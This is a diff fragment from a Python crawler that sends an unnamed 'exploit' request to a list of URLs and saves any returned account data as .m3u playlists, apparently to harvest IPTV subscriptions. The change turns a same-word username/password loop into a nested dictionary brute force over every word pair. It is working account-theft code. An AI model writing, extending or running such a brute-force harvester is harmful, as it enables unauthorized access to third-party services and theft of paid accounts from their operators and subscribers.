@@ -83,25 +83,27 @@ class Crawler(object):
                 url = random.choice(self.parsedUrls)
             fileName = self.languageDir + "/" + self.language + ".txt"
             fileLength = self.file_length(fileName)
+            fileLength = fileLength * fileLength;
             progressBar = pyprind.ProgBar(fileLength, title = "Fetching account from " + url + " this might take a while.", stream = 1, monitor = True)
             foundedAccounts = 0
             with open(fileName) as f:
                 rows = f.readlines()
-            for row in rows:
-                # Do the injection to the current url using the exploit that we know
-                opener = urllib2.build_opener()
-                opener.addheaders = [('User-agent', 'Mozilla/5.0')]
-                response = opener.open(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
-                fetched = response.read()
-                # Update the progress bar in order to give to the user a nice
-                # way to indicate the time left
-                fileLength = fileLength - 1
-                progressBar.update()
-                # IF the fetched content is not empty
-                # we build the dedicated .m3u file
-                if len(fetched) > 0:
-                    newPath = self.outputDir + "/" + url.replace("http://", "")
-                    self.create_file(row, newPath, fetched)
+            for user in rows:
+                for password in rows:
+                    # Do the injection to the current url using the exploit that we know
+                    opener = urllib2.build_opener()
+                    opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+                    response = opener.open(url + self.basicString % (user.rstrip().lstrip(), password.rstrip().lstrip()))
+                    fetched = response.read()
+                    # Update the progress bar in order to give to the user a nice
+                    # way to indicate the time left
+                    fileLength = fileLength - 1
+                    progressBar.update()
+                    # IF the fetched content is not empty
+                    # we build the dedicated .m3u file
+                    if len(fetched) > 0:
+                        newPath = self.outputDir + "/" + url.replace("http://", "")
+                        self.create_file(user, newPath, fetched)
             # Remove the current used url in order to avoid to parse it again
             self.parsedUrls.remove(url)
             if self.foundedAccounts != 0:
